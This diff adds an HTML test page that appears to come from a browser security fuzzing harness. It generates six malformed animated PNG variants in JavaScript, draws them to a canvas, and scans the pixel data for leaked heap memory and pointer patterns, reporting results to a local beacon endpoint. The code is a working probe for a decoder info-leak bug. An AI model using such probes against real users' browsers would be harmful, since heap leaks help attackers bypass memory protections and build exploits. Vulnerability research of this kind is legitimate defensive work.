@@ -1,0 +1,332 @@
+<!--
+  p595: APNG decoder overread — heap info leak via malformed animated PNG.
+
+  Generates malformed APNG images in JS, loads as Blob URL, draws to Canvas,
+  reads back via getImageData(), scans for non-zero pixels indicating heap data.
+
+  Variants tested:
+  A) Valid 2-frame APNG (control — should have clean pixels)
+  B) APNG where frame 2 fdAT has short zlib stream (fewer rows than declared)
+  C) APNG with sub-frame (frame 2 smaller than IHDR)
+  D) APNG with many frames (trigger interlace buffer reuse)
+  E) APNG with dispose_op=2 (RestoreToPrevious) on frame 0
+  F) Large canvas APNG (maximize adjacent heap exposure)
+
+  If ANY variant shows non-zero pixels where expected zero, that's heap leakage.
+  Code pointers would appear as specific byte patterns in pixel RGBA values.
+
+  CRASH_CLASS: MODERATE (image decode, read-only)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p595</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+// CRC-32 table
+var CRC_T=null;
+function crc32(buf){
+  if(!CRC_T){CRC_T=new Int32Array(256);for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;CRC_T[n]=c;}}
+  var crc=-1;
+  for(var i=0;i<buf.length;i++)crc=CRC_T[(crc^buf[i])&0xFF]^(crc>>>8);
+  return(crc^-1)>>>0;
+}
+
+// Build a PNG chunk: type(4-char string) + data(Uint8Array) → Uint8Array
+function chunk(type,data){
+  var len=data.length;
+  var out=new Uint8Array(12+len);
+  out[0]=(len>>>24)&0xFF;out[1]=(len>>>16)&0xFF;out[2]=(len>>>8)&0xFF;out[3]=len&0xFF;
+  out[4]=type.charCodeAt(0);out[5]=type.charCodeAt(1);out[6]=type.charCodeAt(2);out[7]=type.charCodeAt(3);
+  out.set(data,8);
+  var ci=new Uint8Array(4+len);ci[0]=out[4];ci[1]=out[5];ci[2]=out[6];ci[3]=out[7];ci.set(data,4);
+  var c=crc32(ci);
+  out[8+len]=(c>>>24)&0xFF;out[9+len]=(c>>>16)&0xFF;out[10+len]=(c>>>8)&0xFF;out[11+len]=c&0xFF;
+  return out;
+}
+
+// Zlib "stored" compression (level 0) of raw bytes
+function zlibStore(data){
+  var out=[];
+  out.push(0x78,0x01); // CMF, FLG
+  // Can only store up to 65535 bytes per block
+  var off=0;
+  while(off<data.length){
+    var remain=data.length-off;
+    var blen=Math.min(remain,65535);
+    var isFinal=(off+blen>=data.length)?1:0;
+    out.push(isFinal);
+    out.push(blen&0xFF,(blen>>>8)&0xFF);
+    out.push((~blen)&0xFF,((~blen)>>>8)&0xFF);
+    for(var i=0;i<blen;i++)out.push(data[off+i]);
+    off+=blen;
+  }
+  // Adler-32
+  var a=1,bb=0;
+  for(var i=0;i<data.length;i++){a=(a+data[i])%65521;bb=(bb+a)%65521;}
+  var ad=(bb<<16)|a;
+  out.push((ad>>>24)&0xFF,(ad>>>16)&0xFF,(ad>>>8)&0xFF,ad&0xFF);
+  return new Uint8Array(out);
+}
+
+// Write big-endian u32
+function w32(arr,off,v){arr[off]=(v>>>24)&0xFF;arr[off+1]=(v>>>16)&0xFF;arr[off+2]=(v>>>8)&0xFF;arr[off+3]=v&0xFF;}
+function w16(arr,off,v){arr[off]=(v>>>8)&0xFF;arr[off+1]=v&0xFF;}
+
+// PNG signature
+var SIG=new Uint8Array([137,80,78,71,13,10,26,10]);
+
+// Make IHDR chunk
+function mkIHDR(w,h,depth,ctype){
+  var d=new Uint8Array(13);
+  w32(d,0,w);w32(d,4,h);d[8]=depth;d[9]=ctype;d[10]=0;d[11]=0;d[12]=0;
+  return chunk('IHDR',d);
+}
+
+// Make acTL (animation control)
+function mkACTL(nframes,nplays){
+  var d=new Uint8Array(8);w32(d,0,nframes);w32(d,4,nplays);
+  return chunk('acTL',d);
+}
+
+// Make fcTL (frame control)
+function mkFCTL(seq,w,h,xoff,yoff,delayNum,delayDen,dispose,blend){
+  var d=new Uint8Array(26);
+  w32(d,0,seq);w32(d,4,w);w32(d,8,h);w32(d,12,xoff);w32(d,16,yoff);
+  w16(d,20,delayNum);w16(d,22,delayDen);d[24]=dispose;d[25]=blend;
+  return chunk('fcTL',d);
+}
+
+// Make raw pixel rows (filter=0, RGBA). fill is [R,G,B,A] or null for zeros.
+function mkRows(w,h,fill){
+  var rowLen=1+w*4; // filter byte + RGBA
+  var raw=new Uint8Array(rowLen*h);
+  for(var y=0;y<h;y++){
+    raw[y*rowLen]=0; // filter=None
+    if(fill){
+      for(var x=0;x<w;x++){
+        var off=y*rowLen+1+x*4;
+        raw[off]=fill[0];raw[off+1]=fill[1];raw[off+2]=fill[2];raw[off+3]=fill[3];
+      }
+    }
+  }
+  return raw;
+}
+
+// Make IDAT chunk from raw rows
+function mkIDAT(rows){return chunk('IDAT',zlibStore(rows));}
+
+// Make fdAT chunk from raw rows with sequence number
+function mkFDAT(seq,rows){
+  var zdata=zlibStore(rows);
+  var d=new Uint8Array(4+zdata.length);
+  w32(d,0,seq);d.set(zdata,4);
+  return chunk('fdAT',d);
+}
+
+// Make IEND
+function mkIEND(){return chunk('IEND',new Uint8Array(0));}
+
+// Concat Uint8Arrays
+function cat(){
+  var total=0;for(var i=0;i<arguments.length;i++)total+=arguments[i].length;
+  var out=new Uint8Array(total);var off=0;
+  for(var i=0;i<arguments.length;i++){out.set(arguments[i],off);off+=arguments[i].length;}
+  return out;
+}
+
+// Load image from Uint8Array, draw to canvas, read pixels
+function testAPNG(name, pngBytes, w, h, frameDelay, cb) {
+  var blob = new Blob([pngBytes], {type:'image/png'});
+  var url = URL.createObjectURL(blob);
+  var img = new Image();
+  img.onload = function() {
+    b(name + ':LOADED,' + img.width + 'x' + img.height);
+
+    var cv = document.createElement('canvas');
+    cv.width = w; cv.height = h;
+    var ctx = cv.getContext('2d');
+
+    // Draw frame 0 immediately
+    ctx.drawImage(img, 0, 0);
+    var id0 = ctx.getImageData(0, 0, w, h);
+    scanPixels(name + '-F0', id0.data, w, h);
+
+    // Wait for animation to advance, draw frame 1
+    if (frameDelay > 0) {
+      setTimeout(function() {
+        ctx.clearRect(0, 0, w, h);
+        ctx.drawImage(img, 0, 0);
+        var id1 = ctx.getImageData(0, 0, w, h);
+        scanPixels(name + '-F1', id1.data, w, h);
+        URL.revokeObjectURL(url);
+        cb();
+      }, frameDelay + 50);
+    } else {
+      URL.revokeObjectURL(url);
+      cb();
+    }
+  };
+  img.onerror = function() {
+    b(name + ':ERR');
+    URL.revokeObjectURL(url);
+    cb();
+  };
+  img.src = url;
+}
+
+function scanPixels(tag, data, w, h) {
+  var nz = 0, nzAlpha = 0;
+  var interesting = [];
+  var totalPx = w * h;
+
+  for (var i = 0; i < data.length; i += 4) {
+    var r=data[i], g=data[i+1], bb=data[i+2], a=data[i+3];
+    if (r||g||bb||a) {
+      nz++;
+      if (a !== 0 && a !== 255) nzAlpha++;
+      // Check for pointer-like patterns in RGBA quads
+      // A heap ptr lo-word like 0x008bXXXX would show as specific R,G,B,A bytes
+      if (interesting.length < 12) {
+        var px = i/4;
+        interesting.push(px + '=' + r + '.' + g + '.' + bb + '.' + a);
+      }
+    }
+  }
+
+  b(tag + ':NZ=' + nz + '/' + totalPx + ',NZA=' + nzAlpha);
+  if (interesting.length > 0) {
+    for (var j = 0; j < interesting.length; j += 4) {
+      b(tag + ':PX=' + interesting.slice(j, j+4).join('|'));
+    }
+  }
+}
+
+function main() {
+b('G');
+
+var W = 64, H = 64;
+
+// ============================================================
+// Variant A: Valid 2-frame APNG (control)
+// Frame 0: red, Frame 1: blue. Both full canvas.
+// ============================================================
+var vA = cat(SIG,
+  mkIHDR(W, H, 8, 6), // RGBA
+  mkACTL(2, 0),
+  mkFCTL(0, W, H, 0, 0, 10, 1000, 0, 0), // 10ms delay, dispose=none, blend=source
+  mkIDAT(mkRows(W, H, [255, 0, 0, 255])), // red
+  mkFCTL(1, W, H, 0, 0, 10, 1000, 0, 0),
+  mkFDAT(2, mkRows(W, H, [0, 0, 255, 255])), // blue
+  mkIEND()
+);
+b('VA:size=' + vA.length);
+
+// ============================================================
+// Variant B: Frame 2 has SHORT fdAT (only 1 row instead of H)
+// ============================================================
+var shortRows = mkRows(W, 1, [0, 255, 0, 255]); // only 1 row, green
+var vB = cat(SIG,
+  mkIHDR(W, H, 8, 6),
+  mkACTL(2, 0),
+  mkFCTL(0, W, H, 0, 0, 10, 1000, 0, 0),
+  mkIDAT(mkRows(W, H, [255, 0, 0, 255])),
+  mkFCTL(1, W, H, 0, 0, 10, 1000, 0, 0),
+  mkFDAT(2, shortRows), // short: only 1 row compressed
+  mkIEND()
+);
+b('VB:size=' + vB.length);
+
+// ============================================================
+// Variant C: Sub-frame — frame 2 is 8x8 at offset (28,28)
+// Canvas is 64x64 but frame only covers a small region
+// ============================================================
+var subW = 8, subH = 8, subX = 28, subY = 28;
+var vC = cat(SIG,
+  mkIHDR(W, H, 8, 6),
+  mkACTL(2, 0),
+  mkFCTL(0, W, H, 0, 0, 10, 1000, 0, 0),
+  mkIDAT(mkRows(W, H, [128, 128, 128, 255])), // gray
+  mkFCTL(1, subW, subH, subX, subY, 10, 1000, 0, 0),
+  mkFDAT(2, mkRows(subW, subH, [255, 255, 0, 255])), // yellow sub-frame
+  mkIEND()
+);
+b('VC:size=' + vC.length);
+
+// ============================================================
+// Variant D: Many frames (16) with dispose_op=1 (clear to black)
+// Trigger interlace buffer reuse between frames
+// ============================================================
+var dChunks = [SIG, mkIHDR(W, H, 8, 6), mkACTL(16, 0)];
+var seq = 0;
+// frame 0 (uses IDAT)
+dChunks.push(mkFCTL(seq++, W, H, 0, 0, 10, 1000, 1, 0)); // dispose=clear
+dChunks.push(mkIDAT(mkRows(W, H, [255, 0, 0, 255])));
+// frames 1-15 (use fdAT), each a small sub-frame
+for (var f = 1; f < 16; f++) {
+  var fw = 4, fh = 4, fx = (f*4)%60, fy = (f*4)%60;
+  dChunks.push(mkFCTL(seq++, fw, fh, fx, fy, 10, 1000, 1, 0));
+  dChunks.push(mkFDAT(seq++, mkRows(fw, fh, [f*16, 255-f*16, 128, 255])));
+}
+dChunks.push(mkIEND());
+var vD = cat.apply(null, dChunks);
+b('VD:size=' + vD.length);
+
+// ============================================================
+// Variant E: dispose_op=2 (RestoreToPrevious) on frame 0
+// Per APNG spec this should be treated as dispose_op=0, but
+// a buggy decoder might try to restore from non-existent previous
+// ============================================================
+var vE = cat(SIG,
+  mkIHDR(W, H, 8, 6),
+  mkACTL(2, 0),
+  mkFCTL(0, W, H, 0, 0, 10, 1000, 2, 0), // dispose=RestoreToPrevious on first frame
+  mkIDAT(mkRows(W, H, [0, 255, 0, 255])), // green
+  mkFCTL(1, W, H, 0, 0, 10, 1000, 0, 0),
+  mkFDAT(2, mkRows(W, H, [255, 0, 255, 255])), // magenta
+  mkIEND()
+);
+b('VE:size=' + vE.length);
+
+// ============================================================
+// Variant F: Large canvas (256x256) — maximize heap exposure
+// ============================================================
+var LW = 256, LH = 256;
+var vF = cat(SIG,
+  mkIHDR(LW, LH, 8, 6),
+  mkACTL(2, 0),
+  mkFCTL(0, LW, LH, 0, 0, 10, 1000, 0, 0),
+  mkIDAT(mkRows(LW, LH, [64, 64, 64, 255])), // dark gray
+  mkFCTL(1, LW, LH, 0, 0, 10, 1000, 0, 0),
+  mkFDAT(2, mkRows(LW, 1, [255, 128, 0, 255])), // SHORT: only 1 row
+  mkIEND()
+);
+b('VF:size=' + vF.length);
+
+// ============================================================
+// Run tests sequentially
+// ============================================================
+var tests = [
+  ['VA', vA, W, H, 80],
+  ['VB', vB, W, H, 80],
+  ['VC', vC, W, H, 80],
+  ['VD', vD, W, H, 300], // 16 frames × ~10ms + buffer
+  ['VE', vE, W, H, 80],
+  ['VF', vF, LW, LH, 80]
+];
+
+var ti = 0;
+function runNext() {
+  if (ti >= tests.length) {
+    b('ALL-DONE');
+    b('ALIVE');
+    return;
+  }
+  var t = tests[ti++];
+  testAPNG(t[0], t[1], t[2], t[3], t[4], runNext);
+}
+
+runNext();
+}
+
+setTimeout(main, 50);
+setTimeout(function(){ b('ALIVE-FALLBACK'); }, 30000);
+</script></head><body>p595</body></html>
